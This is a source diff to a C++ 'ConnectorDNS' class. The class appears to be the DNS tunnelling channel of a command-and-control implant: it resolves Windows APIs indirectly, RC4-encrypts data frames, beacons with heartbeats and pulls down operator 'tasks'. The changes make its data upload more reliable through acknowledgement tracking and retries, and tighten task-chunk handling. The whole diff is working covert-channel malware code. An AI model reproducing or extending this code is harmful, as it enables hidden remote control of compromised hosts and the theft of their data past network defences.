@@ -24,19 +24,19 @@ ConnectorDNS::ConnectorDNS()
     this->functions = (DNSFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(DNSFUNC));
     if (!this->functions) return;
 
-    this->functions->LocalAlloc   = ApiWin->LocalAlloc;
-    this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
-    this->functions->LocalFree    = ApiWin->LocalFree;
-    this->functions->WSAStartup   = ApiWin->WSAStartup;
-    this->functions->WSACleanup   = ApiWin->WSACleanup;
-    this->functions->socket       = ApiWin->socket;
-    this->functions->closesocket  = ApiWin->closesocket;
-    this->functions->sendto       = ApiWin->sendto;
-    this->functions->recvfrom     = ApiWin->recvfrom;
-    this->functions->select       = ApiWin->select;
+    this->functions->LocalAlloc    = ApiWin->LocalAlloc;
+    this->functions->LocalReAlloc  = ApiWin->LocalReAlloc;
+    this->functions->LocalFree     = ApiWin->LocalFree;
+    this->functions->WSAStartup    = ApiWin->WSAStartup;
+    this->functions->WSACleanup    = ApiWin->WSACleanup;
+    this->functions->socket        = ApiWin->socket;
+    this->functions->closesocket   = ApiWin->closesocket;
+    this->functions->sendto        = ApiWin->sendto;
+    this->functions->recvfrom      = ApiWin->recvfrom;
+    this->functions->select        = ApiWin->select;
     this->functions->gethostbyname = ApiWin->gethostbyname;
-    this->functions->Sleep        = ApiWin->Sleep;
-    this->functions->GetTickCount = ApiWin->GetTickCount;
+    this->functions->Sleep         = ApiWin->Sleep;
+    this->functions->GetTickCount  = ApiWin->GetTickCount;
 }
 
 // Destructor
@@ -126,6 +126,67 @@ void ConnectorDNS::ResetDownload()
     this->downAckOffset = 0;
     this->downTaskNonce = 0;
     this->hasPendingTasks = FALSE;
+}
+
+// Reset upload state for retry
+void ConnectorDNS::ResetUploadState()
+{
+    memset(this->confirmedOffsets, 0, sizeof(this->confirmedOffsets));
+    this->confirmedCount = 0;
+    this->lastAckNextExpected = 0;
+    this->uploadNeedsReset = FALSE;
+    this->uploadStartTime = 0;
+}
+
+// Check if offset was confirmed by server
+BOOL ConnectorDNS::IsOffsetConfirmed(ULONG offset)
+{
+    for (ULONG i = 0; i < this->confirmedCount && i < kMaxTrackedOffsets; i++) {
+        if (this->confirmedOffsets[i] == offset) {
+            return TRUE;
+        }
+    }
+    return FALSE;
+}
+
+// Mark offset as confirmed
+void ConnectorDNS::MarkOffsetConfirmed(ULONG offset)
+{
+    if (this->confirmedCount >= kMaxTrackedOffsets) {
+        return;
+    }
+    if (!IsOffsetConfirmed(offset)) {
+        this->confirmedOffsets[this->confirmedCount++] = offset;
+    }
+}
+
+// Parse PUT ACK response from A record
+// Format: [flags:1][nextExpectedOff:3 (big-endian 24-bit)]
+// Flags: 0x01 = complete, 0x02 = needs_reset
+BOOL ConnectorDNS::ParsePutAckResponse(BYTE* response, ULONG respLen, 
+                                        ULONG* outNextExpected, BOOL* outComplete, BOOL* outNeedsReset)
+{
+    if (!response || respLen < 4) {
+        return FALSE;
+    }
+
+    // Response should be 4 bytes (A record IP)
+    BYTE flags = response[0];
+    ULONG nextExpected = ((ULONG)response[1] << 16) | 
+                         ((ULONG)response[2] << 8) | 
+                         (ULONG)response[3];
+
+    if (outComplete) {
+        *outComplete = (flags & 0x01) ? TRUE : FALSE;
+    }
+    if (outNeedsReset) {
+        *outNeedsReset = (flags & 0x02) ? TRUE : FALSE;
+    }
+    if (outNextExpected) {
+        *outNextExpected = nextExpected;
+    }
+
+    return TRUE;
 }
 
 // Private helper: Single DNS query
@@ -480,7 +541,20 @@ void ConnectorDNS::SendHeartbeat()
     ULONG ipSize = 0;
     if (QueryWithRotation(qnameA, "A", ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
         this->lastQueryOk = TRUE;
-        if (ipBuf[0] == 0 && ipBuf[1] == 0 && ipBuf[2] == 0 && ipBuf[3] == 0) {
+        
+        // Parse HB response: [flags:1][reserved:3]
+        // Flags: 0x01 = has pending tasks, 0x02 = needs_reset
+        BYTE flags = ipBuf[0];
+        BOOL hasPending = (flags & 0x01) != 0;
+        BOOL needsReset = (flags & 0x02) != 0;
+
+        if (needsReset) {
+            // Server indicates our upload was lost - reset upload state
+            this->uploadNeedsReset = TRUE;
+            ResetUploadState();
+        }
+
+        if (!hasPending) {
             this->seq++;
             this->downAckOffset = 0;
             this->hasPendingTasks = FALSE;
@@ -619,11 +693,29 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         if (total > kMaxUploadSize)
             total = kMaxUploadSize;
 
+        // Reset upload tracking state
+        ResetUploadState();
+        this->uploadStartTime = this->functions->GetTickCount();
+
         ULONG seqForSend = ++this->seq;
         ULONG offset = 0;
+        BOOL uploadComplete = FALSE;
+        int maxUploadRetries = 5;
 
-        while (offset < total) {
-            ULONG chunk = total - offset;
+        while (!uploadComplete && maxUploadRetries > 0) {
+            // Find next unconfirmed offset
+            ULONG sendOffset = offset;
+            while (sendOffset < total && IsOffsetConfirmed(sendOffset)) {
+                sendOffset += maxChunk;
+            }
+            
+            if (sendOffset >= total) {
+                // All offsets confirmed
+                uploadComplete = TRUE;
+                break;
+            }
+
+            ULONG chunk = total - sendOffset;
             if (chunk > maxChunk)
                 chunk = maxChunk;
 
@@ -643,11 +735,11 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             frame[kMetaSize + 1] = (BYTE)((total >> 16) & 0xFF);
             frame[kMetaSize + 2] = (BYTE)((total >> 8) & 0xFF);
             frame[kMetaSize + 3] = (BYTE)((total >> 0) & 0xFF);
-            frame[kMetaSize + 4] = (BYTE)((offset >> 24) & 0xFF);
-            frame[kMetaSize + 5] = (BYTE)((offset >> 16) & 0xFF);
-            frame[kMetaSize + 6] = (BYTE)((offset >> 8) & 0xFF);
-            frame[kMetaSize + 7] = (BYTE)((offset >> 0) & 0xFF);
-            memcpy(frame + kHeaderSize, data + offset, chunk);
+            frame[kMetaSize + 4] = (BYTE)((sendOffset >> 24) & 0xFF);
+            frame[kMetaSize + 5] = (BYTE)((sendOffset >> 16) & 0xFF);
+            frame[kMetaSize + 6] = (BYTE)((sendOffset >> 8) & 0xFF);
+            frame[kMetaSize + 7] = (BYTE)((sendOffset >> 0) & 0xFF);
+            memcpy(frame + kHeaderSize, data + sendOffset, chunk);
 
             EncryptRC4(frame, frameSize, this->encryptKey, 16);
 
@@ -673,16 +765,53 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             
             if (!putOk) {
                 this->lastQueryOk = FALSE;
-                return;
+                maxUploadRetries--;
+                continue;
+            }
+
+            // Parse PUT ACK response
+            ULONG nextExpected = 0;
+            BOOL complete = FALSE;
+            BOOL needsReset = FALSE;
+            if (tmpSize >= 4 && ParsePutAckResponse(tmp, tmpSize, &nextExpected, &complete, &needsReset)) {
+                if (needsReset) {
+                    // Server requested upload reset - restart from beginning
+                    ResetUploadState();
+                    offset = 0;
+                    maxUploadRetries--;
+                    continue;
+                }
+                if (complete) {
+                    uploadComplete = TRUE;
+                    break;
+                }
+                // Mark current offset as confirmed
+                MarkOffsetConfirmed(sendOffset);
+                this->lastAckNextExpected = nextExpected;
+                
+                // Check if server expects a different offset (gap detected)
+                if (nextExpected < sendOffset && !IsOffsetConfirmed(nextExpected)) {
+                    // Server wants us to resend an earlier fragment
+                    offset = nextExpected;
+                } else {
+                    offset = sendOffset + chunk;
+                }
+            } else {
+                // Failed to parse response, assume current offset is ok and continue
+                MarkOffsetConfirmed(sendOffset);
+                offset = sendOffset + chunk;
             }
 
             ULONG pacing = 30 + (this->functions->GetTickCount() % 20);
             this->functions->Sleep(pacing);
-
-            offset += chunk;
         }
-        this->lastUpTotal = total;
-        this->lastQueryOk = TRUE;
+
+        if (uploadComplete || offset >= total) {
+            this->lastUpTotal = total;
+            this->lastQueryOk = TRUE;
+        } else {
+            this->lastQueryOk = FALSE;
+        }
         
         // Send ACK if needed
         if (this->downAckOffset > 0) {
@@ -797,26 +926,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             }
             
             if (total > 0 && total <= kMaxDownloadSize && offset < total) {
-                // Handle offset mismatch
-                if (offset != reqOffset) {
-                    if (offset == 0 && reqOffset > 0 && chunkLen >= 9) {
-                        ULONG newTaskNonce = 0;
-                        newTaskNonce |= (ULONG)binBuf[headerSize + 1];
-                        newTaskNonce |= ((ULONG)binBuf[headerSize + 2] << 8);
-                        newTaskNonce |= ((ULONG)binBuf[headerSize + 3] << 16);
-                        newTaskNonce |= ((ULONG)binBuf[headerSize + 4] << 24);
-                        
-                        if (newTaskNonce != 0 && newTaskNonce != this->downTaskNonce) {
-                            ResetDownload();
-                        } else {
-                            return;
-                        }
-                    } else {
-                        return;
-                    }
-                }
-                
-                // Extract task nonce from first chunk
+                // Extract task nonce from first chunk (if this is offset 0)
                 ULONG chunkTaskNonce = 0;
                 if (offset == 0 && chunkLen >= 9) {
                     chunkTaskNonce |= (ULONG)binBuf[headerSize + 1];
@@ -825,16 +935,65 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                     chunkTaskNonce |= ((ULONG)binBuf[headerSize + 4] << 24);
                 }
                 
-                BOOL isNewTask = (!this->downBuf || this->downTotal != total);
-                if (!isNewTask && offset == 0 && chunkTaskNonce != 0 && chunkTaskNonce != this->downTaskNonce) {
+                // Determine if this is a new task or continuation
+                BOOL isNewTask = FALSE;
+                BOOL isValidContinuation = FALSE;
+                
+                if (!this->downBuf || this->downTotal == 0) {
+                    // No current download - this must be a new task
                     isNewTask = TRUE;
+                } else if (this->downTotal != total) {
+                    // Different total size - definitely a new task
+                    isNewTask = TRUE;
+                } else if (offset == 0 && chunkTaskNonce != 0) {
+                    // Offset 0 chunk with nonce - check if it's a new task
+                    if (chunkTaskNonce != this->downTaskNonce) {
+                        // Different nonce - new task
+                        isNewTask = TRUE;
+                    } else if (this->downFilled > 0) {
+                        // Same nonce but we already have data - this is a retransmission
+                        // Ignore if we've already acked this
+                        if (this->downAckOffset > 0) {
+                            return;
+                        }
+                    }
+                } else {
+                    // Continuation chunk - validate offset
+                    isValidContinuation = TRUE;
                 }
                 
-                if (isNewTask && offset == 0 && chunkTaskNonce != 0 && 
-                    chunkTaskNonce == this->downTaskNonce && this->downAckOffset > 0) {
-                    return;
+                // Handle offset mismatch for continuation chunks
+                if (isValidContinuation && offset != reqOffset) {
+                    // Server sent different offset than we requested
+                    if (offset == 0 && chunkLen >= 9) {
+                        // Server is starting a new task - extract and check nonce
+                        ULONG newNonce = 0;
+                        newNonce |= (ULONG)binBuf[headerSize + 1];
+                        newNonce |= ((ULONG)binBuf[headerSize + 2] << 8);
+                        newNonce |= ((ULONG)binBuf[headerSize + 3] << 16);
+                        newNonce |= ((ULONG)binBuf[headerSize + 4] << 24);
+                        
+                        if (newNonce != 0 && newNonce != this->downTaskNonce) {
+                            // New task started - reset and accept
+                            ResetDownload();
+                            isNewTask = TRUE;
+                            chunkTaskNonce = newNonce;
+                        } else {
+                            // Same task but server is resending from start - something wrong
+                            // Request the offset we actually need by returning
+                            return;
+                        }
+                    } else if (offset < reqOffset) {
+                        // Server sent an earlier offset - data we already have, ignore
+                        return;
+                    } else {
+                        // Server sent a later offset - we're missing data, request resend
+                        // by not processing this and waiting for correct offset
+                        return;
+                    }
                 }
                 
+                // Initialize new download buffer if needed
                 if (isNewTask) {
                     if (this->downBuf && this->downTotal) {
                         MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
@@ -848,19 +1007,27 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                     this->downTotal = total;
                     this->downFilled = 0;
                     this->downAckOffset = 0;
-                    this->downTaskNonce = chunkTaskNonce;
+                    if (offset == 0 && chunkTaskNonce != 0) {
+                        this->downTaskNonce = chunkTaskNonce;
+                    }
                     
-                    if (offset != 0)
+                    // For new task, we must start at offset 0
+                    if (offset != 0) {
                         return;
+                    }
                 }
 
+                // Copy chunk data to buffer
                 ULONG end = offset + chunkLen;
                 if (end > total)
                     end = total;
                 ULONG n = end - offset;
                 memcpy(this->downBuf + offset, binBuf + headerSize, n);
                 
-                this->downFilled = offset + n;
+                // Update progress
+                if (offset + n > this->downFilled) {
+                    this->downFilled = offset + n;
+                }
                 this->downAckOffset = this->downFilled;
 
                 if (this->downFilled >= this->downTotal) {
